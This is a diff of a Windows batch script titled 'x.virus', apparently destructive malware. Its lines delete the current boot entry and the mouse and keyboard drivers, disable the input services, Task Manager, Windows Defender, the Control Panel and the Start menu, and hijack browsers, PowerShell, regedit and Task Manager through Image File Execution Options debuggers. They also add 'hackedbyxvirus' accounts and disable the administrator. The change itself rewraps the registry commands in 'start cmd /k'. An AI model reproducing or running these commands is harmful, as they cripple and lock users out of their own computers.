@@ -141,31 +141,30 @@ bcdedit /delete {current} /f
     title x.virus
     del C:\WINDOWS\system\MOUSE.DRV
     del C:\WINDOWS\system\KEYBOARD.DRV
-    del C:\WINDOWS\system32\drivers\cdrom.sys
-    reg add HKLM\System\CurrentControlSet\Services\Mouclass/v Start /t REG_DWORD /d4/f > nul
-    reg add HKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
-    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v BingSearchEnabled /t REG_DWORD /d 0 /f
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v CortanaConsent /t REG_DWORD /d 0 /f
-    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
-    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
-    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
-    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Chrome && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Edge && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Firefox && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Opera && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\brave.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Brave && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Internet Explorer && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell ISE && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Task Manager && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
+     start cmd /k reg add HKLM\System\CurrentControlSet\Services\Mouclass/v Start /t REG_DWORD /d4/f > nul
+     start cmd /k reg add HKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
+     start cmd /k reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+     start cmd /k reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+     start cmd /k reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v BingSearchEnabled /t REG_DWORD /d 0 /f
+     start cmd /k reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v CortanaConsent /t REG_DWORD /d 0 /f
+     start cmd /k reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
+     start cmd /k reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
+     start cmd /k reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+     start cmd /k reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
+     start cmd /k reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+     start cmd /k reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
+     start cmd /k reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Chrome && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Edge && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Firefox && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Opera && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\brave.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Brave && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Internet Explorer && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell ISE && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Task Manager && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
+     start cmd /k reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
     net user hackedbyxvirus%random% /add /random /passwordchg:yes
     net user administrator /active:no
     color a
